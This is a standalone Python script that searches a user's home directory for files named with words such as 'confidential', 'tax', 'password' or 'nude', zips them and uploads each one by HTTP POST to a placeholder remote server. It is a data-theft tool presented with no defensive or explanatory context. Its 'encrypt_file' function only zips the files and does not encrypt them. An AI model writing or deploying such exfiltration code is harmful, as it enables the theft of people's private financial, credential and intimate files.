import os
import zipfile
import requests
from zipfile import ZipFile


def find_confidential_files(path):
    for root, _, files in os.walk(path):
        for file in files:
            if any(keyword in file for keyword in ['confidential', 'tax', 'password', 'nude']):
                yield os.path.join(root, file)


def encrypt_file(file_path, key):
    with open(file_path, 'rb') as f:
        data = f.read()

    os.makedirs('temp', exist_ok=True)

    zip_path = 'temp/staged_{}.zip'.format(os.path.basename(file_path))
    with ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
        zf.writestr(os.path.basename(file_path), data)


def upload_files():
    for file_name in os.listdir('temp'):
        if file_name.endswith('.zip'):
            zip_path = os.path.join('temp', file_name)

            with ZipFile(zip_path, 'r') as zf:
                for file in zf.namelist():
                    data = zf.read(file)
                    print('Uploading {}. {} bytes'.format(file, len(data)))

                    # Replace with your actual server URL
                    r = requests.post(
                        "YOUR_REMOTE_SERVER",
                        files={'file': (file, data)}
                    )


def main(target_dir=os.environ.get('HOME', '.')):
    for file in find_confidential_files(target_dir):
        encrypt_file(file, b'\x01')

    print('Encrypted files:')
    for file in find_confidential_files(target_dir):
        with open(file, 'rb') as f:
            print(f'{os.path.basename(file)} -> {len(f.read())} bytes')

    upload_files()


if __name__ == '__main__':
    main()